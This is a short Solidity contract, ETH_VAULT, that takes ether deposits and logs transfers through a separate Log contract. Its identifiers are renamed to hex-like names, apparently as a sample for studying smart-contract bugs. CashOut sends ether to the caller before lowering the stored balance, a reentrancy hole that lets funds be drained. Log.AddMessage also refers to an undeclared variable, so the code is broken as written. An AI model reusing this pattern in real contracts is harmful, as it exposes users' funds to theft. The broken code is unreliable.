pragma solidity ^0.4.19;

contract ETH_VAULT
{
    mapping (address => uint) public _0x972e2e;

    uint public MinDeposit = 1 ether;

    Log TransferLog;

    function ETH_VAULT(address _0x0a5e3c)
    public
    {
        TransferLog = Log(_0x0a5e3c);
    }

    function Deposit()
    public
    payable
    {
        if(msg.value > MinDeposit)
        {
            _0x972e2e[msg.sender]+=msg.value;
            TransferLog.AddMessage(msg.sender,msg.value,"Deposit");
        }
    }

    function CashOut(uint _0xc533a1)
    public
    payable
    {
        if(_0xc533a1<=_0x972e2e[msg.sender])
        {
            if(msg.sender.call.value(_0xc533a1)())
            {
                _0x972e2e[msg.sender]-=_0xc533a1;
                TransferLog.AddMessage(msg.sender,_0xc533a1,"CashOut");
            }
        }
    }

    function() public payable{}

}

contract Log
{

    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }

    Message[] public History;

    Message LastMsg;

    function AddMessage(address _0x1f10b1,uint _0xed0261,string _0x25a8b9)
    public
    {
        LastMsg.Sender = _0x1f10b1;
        LastMsg.Time = _0xde9b15;
        LastMsg.Val = _0xed0261;
        LastMsg.Data = _0x25a8b9;
        History.push(LastMsg);
    }
}